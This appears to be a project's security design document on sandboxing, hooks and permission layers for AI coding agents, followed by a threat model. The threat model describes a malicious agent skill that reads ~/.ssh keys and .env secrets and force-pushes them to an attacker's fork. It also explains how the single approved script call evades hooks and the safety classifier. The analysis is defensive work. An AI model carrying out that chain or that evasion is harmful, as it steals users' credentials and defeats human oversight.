   The narrower `allowRead` entries survive the broader deny, so `ssh` can still verify the host and read its own configuration while the private key stays unreadable. Note the platform split: `allowUnixSockets` is macOS only, because "Claude Code ignores this list on Linux and WSL2, where the seccomp filter can't inspect socket paths; use `allowAllUnixSockets` there instead" ([[13]](#references-part-4)). On Linux the optional seccomp filter is what blocks Unix sockets in the first place, so without it the agent socket already works.

2. **Give `gh` a scoped token through the environment instead of a readable config.** A token in `GH_TOKEN` limited to the repositories the agent needs is smaller than the whole `~/.config/gh` directory, and it can be hidden from the agent with a `mask` entry rather than a `deny` one, which is the mode that "protects a credential while keeping the tools that authenticate with it working" ([[9]](#references-part-4)). A `deny` entry on the same variable would break `gh` exactly as the directory deny does.

3. **`excludedCommands` only as a last resort.** Adding `git *` or `gh *` runs those commands outside the sandbox entirely, which removes the boundary for the command rather than widening it by one path. It also removes the network allowlist for them.

**Do not try to `mask` an SSH private key.** Masking works by substituting the real value on outbound requests through the sandbox's HTTP proxy, and it requires TLS termination ([[9]](#references-part-4)). SSH is not HTTP and does not pass through that proxy, and on macOS a `mask` entry on a file is applied as `deny` anyway. The agent socket is the mechanism for keys; masking is the mechanism for tokens.

**What this means for the project's PR rule.** `CLAUDE.md` requires the agent to open a draft pull request, which is a `gh` call, so a credential policy that denies `~/.config/gh` without providing option 2 leaves the agent unable to finish its own workflow. The disclaimer should state the credential path it expects, rather than recommending a deny list that silently makes the documented workflow impossible.

#### A PEP 723 script run with `uv`, verified

A skill that ships a PEP 723 script is the case where this stops being theoretical, because `uv` writes outside the repository before the script's first line runs. The behavior below was measured with `uv 0.9.25` by pointing `UV_CACHE_DIR` and `TMPDIR` at a read-only directory, which reproduces what the sandbox does.

**Yes, the default invocation fails.** `uv` writes to its cache, `~/.cache/uv` on Linux, before resolving anything:

```console
$ UV_CACHE_DIR=<read-only dir> uv run script.py
error: failed to open file `<read-only dir>/CACHEDIR.TAG`: Permission denied (os error 13)
```

It fails on the cache marker file, so no network request and no dependency resolution happens first. A read-only home directory stops the run immediately.

**`--no-cache` succeeds under the default sandbox, with no `allowWrite` at all.** The flag moves the write to a temporary directory instead of removing it:

```console
$ UV_CACHE_DIR=<read-only dir> uv run --no-cache script.py
     ^__^
     (oo)\_______
```

and the same command fails once the temporary directory is read-only too, which confirms where the write went:

```console
$ UV_CACHE_DIR=<read-only dir> TMPDIR=<read-only dir> uv run --no-cache script.py
error: Permission denied (os error 13) at path "<read-only dir>/.tmpjm4HH8"
```

This lands exactly on a sandbox default: the session temp directory is writable, and Claude Code sets `$TMPDIR` to it for sandboxed commands ([[9]](#references-part-4)). So `uv run --no-cache` works inside the sandbox as shipped.

Note that allowing `/tmp` in `allowWrite` is not what makes this work, and is not needed. The writable location is the session temp directory that `$TMPDIR` points at, not the literal `/tmp` path. `/tmp` only matters for a tool that hard-codes it.

**Two writes remain that `--no-cache` does not move.**

- **A managed interpreter.** `uv python dir` resolves to `~/.local/share/uv/python`. If the script's `requires-python` forces `uv` to download an interpreter rather than use one already on the system, that write happens outside the repository regardless of the cache flag.
- **Nothing else, in the measured case.** The ephemeral environment `uv` builds for the script goes to the temp directory along with the cache.

**The network side fails separately.** The sandbox filters egress, so `uv` also needs `pypi.org` and `files.pythonhosted.org` in the domain allowlist, or it prompts on the first connection and the classifier decides in auto mode. A filesystem-only fix leaves this failure in place.

**Recommendation for a skill that ships such a script.** Prefer, in order:

1. Invoke it as `uv run --no-cache`, which needs no host configuration and no `allowWrite` entry. The cost is re-downloading dependencies on each run.
2. Pin the cache into the repository with `UV_CACHE_DIR=.agents/cache/uv`, which keeps the cache warm and stays inside the writable working directory. Add the path to `.gitignore`.
3. Ask the developer for `allowWrite: ["~/.cache/uv", "~/.local/share/uv"]` only when neither of the above fits, since this is the option that widens the boundary for every command, not just for `uv`.

Either way the domain allowlist is a prerequisite, and it belongs in the disclaimer alongside the sandbox recommendation.

#### The container is the layer that closes the enumeration problem

Every mechanism above is a list. Deny rules are a list of what is closed, `credentials.files` is a list of secrets, `allowWrite` is a list of build caches, and each of them is wrong in the same way when someone forgets an entry. A container removes the question instead of answering it: a home directory that was never mounted has nothing to enumerate, and a read of `~/Pictures` fails because the path does not exist.

That makes it the right default for this project, and it is also the environment the documentation assumes for the loosest permission mode. `bypassPermissions` "skips permission prompts, including for writes to protected paths", and the guidance is to "only use this mode in isolated environments like containers or VMs where Claude Code can't cause damage" ([[1]](#references)). The stricter the isolation below, the simpler the configuration above, which is the same argument the four-layer design makes, taken one layer further down.

It also has a property none of the other layers have: **it is distributable**. Settings files cannot be shipped in a plugin manifest and a checked-in `.claude/settings.json` is only a recommendation, but a `.devcontainer/devcontainer.json` is an ordinary repository file that every developer and CI job picks up the same way. Layer 1 stops being a contract stated in a disclaimer and becomes a file in the repository.

Four things the container does not solve, and they are the ones worth writing down.

- **The credentials that must come in.** A container with no `~/.ssh` and no `gh` token cannot push a branch or open a pull request. Whatever is mounted for that is exactly the material worth protecting, so the enumeration problem returns, shrunk to a set small enough to reason about. Prefer a scoped token passed as an environment variable over a mounted key directory, and keep `sandbox.credentials` applicable to what is left.
- **Network egress.** Isolating the filesystem does not isolate the network. A container with unrestricted egress can still send whatever it can read, so the domain allowlist stays part of the design rather than being replaced by it.
- **The repository itself.** The files this project actually cares about protecting are inside the container, mounted and writable. The worktree discipline in [CLAUDE.md](../CLAUDE.md) and the read-only rule for a `SubAgent` are about that surface, and no amount of host isolation touches it.
- **The Docker socket.** Mounting `/var/run/docker.sock` into the container, or allowing it through the sandbox, hands back host access and undoes the isolation, for the reason already noted above.

The conclusion for the layer design: keep the four layers, and state layer 1 as "run in a container, and configure the sandbox for the case where someone does not". The sandbox settings then stop being the primary defense and become the fallback for a developer working on the host, which is a far more honest description of what a recommendation in a disclaimer can achieve.

### Layer 2: install hooks cross-platform and fire them for this project's components

Feasible, and closer to the goal than expected, with one asymmetry.

#### A `SubAgent` gets exactly the scoping the layer asks for

> **Subagent hooks**: Claude Code runs them only while that subagent is running and removes them when it finishes. ([[10]](#references-part-4))

The hook is declared in the component itself and travels with it:

```yaml
---
name: awh-review-msg-format
description: Review message definitions and report findings.
context: fork
agent: Explore
hooks:
  PreToolUse:
    - matcher: "Bash"
      hooks:
        - type: command
          command: "${CLAUDE_PROJECT_DIR}/.claude/hooks/deny-write.sh"
---
```

The restriction covers the isolated context and nothing else.

#### A `Skill` does not

> **Skill hooks**: Claude Code registers them when you or Claude invoke the skill and keeps running them for the rest of the session, on turns after the skill's own turn as well. To have Claude Code remove a hook after its first successful run instead, set `once: true` on it. ([[10]](#references-part-4))

The same block in a non-forked skill denies `Bash` writes for every later turn as well:

```yaml
---
name: awh-create-package
description: Scaffold a package.
hooks:
  PreToolUse:
    - matcher: "Bash"
      once: true
      hooks:
        - type: command
          command: "${CLAUDE_PROJECT_DIR}/.claude/hooks/deny-write.sh"
---
```

`once: true` removes the hook after its first successful run, which is a different lifetime, not the one the layer wants. A `Skill` runs in the caller's context where the user is present, so it needs no hook at all: the approval prompt is the guardrail.

#### Scoping comes from where the hook is declared, never from a matcher

`matcher` filters on the tool name for `PreToolUse`, and on the agent type for `SubagentStart` and `SubagentStop` ([[10]](#references-part-4)). No hook input field names the active skill, so there is no way to write "fire only while an `awh-` skill runs" in a settings file. A plugin-level hook can still recognize the caller, because the input carries `agent_id` and `agent_type` when the call comes from a subagent:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Edit|Write|NotebookEdit",
        "hooks": [
          { "type": "command", "command": "${CLAUDE_PLUGIN_ROOT}/hooks/deny-for-subagent.sh" }
        ]
      }
    ]
  }
}
```

```bash
#!/usr/bin/env bash
# .claude/hooks/deny-for-subagent.sh
input=$(cat)
agent_type=$(jq -r '.agent_type // ""' <<<"$input")
case "$agent_type" in
  Explore | Plan)
    jq -n '{hookSpecificOutput: {hookEventName: "PreToolUse", permissionDecision: "deny", permissionDecisionReason: "SubAgent is read-only"}}'
    ;;
  *) exit 0 ;;
esac
```

#### A hook restricts in one direction only

The script above can deny, through `permissionDecision: "deny"` or exit code 2. It cannot approve what a deny rule blocks, and the documentation says to "use the permission system rather than a hook to enforce a hard allow or deny" ([[10]](#references-part-4)), because the Bash `if` filter is best effort and falls through when a command cannot be parsed.

#### Codex reaches the same events with a coarser scope

Codex `PreToolUse` intercepts Bash and `apply_patch` edits and can return a deny decision, and hooks load from `~/.codex/hooks.json`, `<repo>/.codex/hooks.json`, the `config.toml` files, and plugin manifests ([[11]](#references-part-4)):

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "apply_patch",
        "hooks": [{ "type": "command", "command": "./.codex/hooks/deny-write.sh" }]
      }
    ]
  }
}
```

Codex hooks are session- or project-scoped rather than attached to a skill or a subagent, so the deny applies to the whole session. Cross-platform enforcement is realistic for Claude and Codex at that price. Cursor and Copilot are unverified and must be checked before the layer is called cross-platform.

### Layer 3: `allowed-tools` for convenience, `disallowed-tools` for the exceptions

Correct as stated for Claude, with one correction and one caveat.

The correction is the coupling shown in layer 1. This front matter is not free of consequence, because the grant reaches the sandbox boundary as well:

```yaml
allowed-tools: Edit
```

Scope it instead:

```yaml
allowed-tools: Edit(/.agents/worktrees/**) Bash(git:*) Glob Grep Read
```

The caveat is that `disallowed-tools` clears at the next user message and its behavior inside a forked context is not documented. Treat it as a second line behind the `agent` field:

```yaml
context: fork
agent: Explore
disallowed-tools: Edit Write NotebookEdit Bash
```

### Layer 4: is the design sound

Yes. It is the standard defense-in-depth ordering, from the layer the model cannot reach to the layer that only states intent, and it correctly refuses to build a guardrail out of prose. Two adjustments make it hold.

**Add the agent type as the first restriction.** One line decides the tool set of the isolated context, needs no settings file, no hook and no user cooperation:

```yaml
context: fork
agent: Explore
```

It is the only per-invocation control that is enforced and travels inside the component itself, so it belongs above hooks in the design rather than beside `disallowed-tools`. Ordered by how little they can be undone:

| Rank | Mechanism                                                | Distributable     | Enforced                                       |
| ---- | -------------------------------------------------------- | ----------------- | ---------------------------------------------- |
| 1    | OS sandbox                                               | No, a contract    | Yes, outside the agent, Bash and children only |
| 2    | `agent` type on a forked skill                           | Yes               | Yes                                            |
| 3    | Hooks in subagent frontmatter, or in the plugin manifest | Yes               | Yes, deny only                                 |
| 4    | Permission deny and ask rules                            | No, settings only | Yes                                            |
| 5    | `disallowed-tools`                                       | Yes               | Yes, until the next user message               |
| 6    | `allowed-tools`                                          | Yes               | No, it pre-approves                            |
| 7    | Prose in `SKILL.md` or `AGENTS.md`                       | Yes               | No                                             |

**Do not let layer 1 carry a restriction that the file tools bypass.** The layer as written assumes the sandbox is the coarse filter that makes everything above it simple. It is that filter for Bash only. Either state the layer as "Bash and its children are sandboxed, and the file tools are governed by `Read` and `Edit` rules", or accept that a `SubAgent` holding `Edit` is outside layer 1 entirely, which is a further argument for the read-only rule in [sub-agent.md](./sub-agent.md).

### References (Part 4)

- [9](https://code.claude.com/docs/en/sandboxing)
- [10](https://code.claude.com/docs/en/hooks)
- [11](https://learn.chatgpt.com/docs/hooks)
- [12](https://code.claude.com/docs/en/permission-modes)
- [13](https://code.claude.com/docs/en/settings-reference#sandbox-settings)

## Part 5

A threat model, used to test the layers against one concrete attack rather than against the documentation.

### The attack

`task-helper` is a plausible-looking skill distributed through a marketplace. Its body and its `scripts/` directory carry out a chain:

1. scan `~/Downloads` and similar directories for `NDA.pdf`, `contract.pdf` and the like;
2. copy what it finds into the repository the user is working in;
3. `cat ~/.ssh/id_*` and copy the private keys in as well;
4. `git add -f .env` to pick up the secrets the repository's own `.gitignore` excludes;
5. commit, and `git push -f` to a fork of a well-known project that the user was earlier persuaded to create;
6. the attacker reads the branch from the fork.

The steps that matter are 3, 4 and 5. Steps 1 and 2 are the same problem as step 3 with a different filename.

### Two structural facts decide most of this

**Everything except the sandbox is blind inside a script.** Permission rules, `allowed-tools`, `disallowed-tools` and `PreToolUse` hooks all evaluate a tool call. The attack makes exactly one tool call, `bash scripts/setup.sh`, and performs steps 1 to 5 inside it. A `PreToolUse` hook matching `Bash` sees the string `bash scripts/setup.sh` and nothing else; the `git push -f` never appears as a tool call. In auto mode the classifier is blind for the same reason, since it reviews the pending action and tool results are stripped from what it sees ([[12]](#references-part-4)).

Only the sandbox observes step 3 and step 5, because it acts on the process rather than on the request: "restrictions apply to all scripts, programs, and subprocesses spawned by commands" ([[9]](#references-part-4)).

This is a stronger statement than the ordering in Part 4 gave. Against a script-borne attack the sandbox is not merely first among the enforcing layers; the layers below it in that table contribute nothing, because they never see the actions.

**One approval buys the whole chain.** `bash scripts/setup.sh` prompts once, the user approves it because the skill they installed appears to need it, and steps 1 to 5 follow with no further interaction. Per-call review does not degrade gracefully here; it is defeated outright by one level of indirection. A skill that ships executable scripts is therefore a different trust category from one that does not, and reviewing those scripts before enabling the skill is the only point at which their content is visible to anyone.

### The chain, step by step

| Step                         | What it needs                                          | What stops it                                                                                                                     | What does not                                                                                                                               |
| ---------------------------- | ------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
| 1, 2. Read `~/Downloads`     | Read outside the working directory                     | A container with no personal mounts; `denyRead: ["~/"]` with dot-directory carve-outs, since `Downloads` is not a dot directory   | `Read` deny rules, which do not apply to a subprocess; the read-only Bash command list, which never prompts for `find` or `cat` in any mode |
| 3. `cat ~/.ssh/id_*`         | Read `~/.ssh`                                          | The same two, plus `denyRead: ["~/.ssh"]` and using an agent socket so no key file exists to read                                 | The same two                                                                                                                                |
| 4. `git add -f .env`         | Read a file inside the repository                      | Nothing in the permission or sandbox layers; the file is inside the working directory and `git` opens it itself                   | `Read(.env)` deny rules, for the same subprocess reason                                                                                     |
| 5. `git push -f <fork>`      | Network egress to `github.com`, and a credential       | A push credential scoped to the repositories the agent legitimately works on                                                      | The domain allowlist, because `github.com` is the one domain that must be allowed                                                           |
| Hijacking `origin` instead   | Writing `.git/config`                                  | The sandbox, which protects `.git/config` and `.git/hooks` even inside the writable working directory ([[9]](#references-part-4)) | —                                                                                                                                           |
| Installing a hook to persist | Writing `.claude/hooks`, `.claude/skills`, `.mcp.json` | The same protection, which "there is no way to exempt" ([[9]](#references-part-4))                                                | —                                                                                                                                           |

### What actually defeats it

**The container, for steps 1 to 3.** A devcontainer that mounts the repository and nothing personal makes `~/Downloads` and `~/.ssh` absent rather than protected. This is the only defense that does not depend on someone having enumerated the right paths, and the reason it is the recommendation in Part 4.

**A repository-scoped credential, for step 5.** This is the control the earlier analysis was missing. The network allowlist cannot help, because the exfiltration channel is `github.com`, which every legitimate workflow needs. What can help is that a push to an unrelated fork requires a credential that reaches that fork. A fine-grained token restricted to the repositories the agent works on turns step 5 into an authentication failure, while leaving the project's own draft-pull-request workflow intact. An SSH key in an agent socket does not have this property: the agent will sign for any repository the key can reach.

So the honest ranking for this attack is: mount nothing personal, and issue a credential that cannot push anywhere else. Both are properties of the environment, not of the permission configuration.

**Step 4 is not defended, and should be treated as accepted.** A repository's own `.env` is inside the working directory, `git` opens it as a subprocess, and no layer discussed here sees it. The repository's `pre-commit` configuration already runs `detect private key`, which catches step 3's payload at commit time, and `git commit --no-verify` bypasses it. The mitigations are outside the agent: do not keep production secrets in a working tree an agent operates on, and rely on server-side secret scanning and push protection on the forge, which run after the push rather than before it.

### What this changes in the layer design

- Promote the sandbox explicitly as the only layer effective against script-borne behavior, and state the reason: every other layer evaluates a tool call, and a script is one tool call.
- State that a skill shipping `scripts/` is a distinct trust category, and that reviewing those scripts is a prerequisite to enabling it. This is a review rule for this project's own marketplace entries as much as advice to users.
- Add the credential scope to the disclaimer, alongside the sandbox recommendation. "Which repositories can this credential push to" is a more useful question than "which domains may be reached".
- Do not present the network allowlist as an exfiltration defense. It stops a naive upload to an attacker-controlled host and does not stop a push to a forge that has to be reachable.

### The `~/.ssh` mount in this repository's devcontainer

The mount is not redundant as the file stands. It is what makes SSH work today, and the agent forwarding it appears to rely on is not wired up.

`.devcontainer/devcontainer.json` declares:

```json
"remoteEnv": { "SSH_AUTH_SOCK": "/ssh-agent" },
"mounts": [
  { "type": "bind", "source": "${localEnv:HOME}/.ssh", "target": "/home/vscode/.ssh" }
]
```

Nothing binds a host socket to `/ssh-agent`. `SSH_AUTH_SOCK` therefore names a path that does not exist in the container, so `ssh` finds no agent, falls back to reading a key file, and succeeds only because `~/.ssh` is mounted. The two settings are not two halves of one mechanism; the environment variable is inert and the mount is carrying the whole thing.

The `SSH_AUTH_SOCK` override is also the pattern from a Docker Compose setup, where a companion mount maps the host socket to `/ssh-agent`. In a Visual Studio Code devcontainer the editor forwards the agent itself and sets `SSH_AUTH_SOCK` to a path it manages, so hardcoding the variable overrides the value that forwarding would have provided.

**Fixing it in the direction Part 5 recommends.** The mounted key is exactly the asset step 3 of the attack copies into the repository, and it is inside the container that was supposed to contain nothing personal. Two ways to remove it:

1. **Drop the mount and let the agent do the signing.** Remove the `SSH_AUTH_SOCK` override and rely on the editor's forwarding, or keep an explicit path and add the matching mount. The host socket path is platform-specific: `${localEnv:SSH_AUTH_SOCK}` on Linux, and `/run/host-services/ssh-auth.sock` on Docker Desktop for macOS. Verify with `ssh-add -l` inside the container rather than by whether `git push` happens to work, because a working push proves nothing while the key mount is still present.

2. **Use HTTPS with a fine-grained token instead of SSH at all.** This is the stronger option for the reason Part 5 gives: an agent signs for every repository the key can reach, while a token can be scoped to the repositories this project works on, which is the control that turns the attack's `push -f` into an authentication failure. `gh` is already installed through the `github-cli` feature, and `gh auth setup-git` makes `git` use the same credential.

**One thing the mount was quietly providing.** `~/.ssh/known_hosts` and `~/.ssh/config` come in with it, and neither the `Dockerfile` nor `post_create.sh` sets up host keys. Removing the mount leaves the container with no known hosts, so the first push either prompts or fails in a non-interactive run. Add the host key at build time:

```dockerfile
RUN ssh-keyscan github.com >> /etc/ssh/ssh_known_hosts
```

This is worth doing regardless of which option above is chosen, because `StrictHostKeyChecking=accept-new` trades a real protection for convenience while `ssh-keyscan` at build time does not.
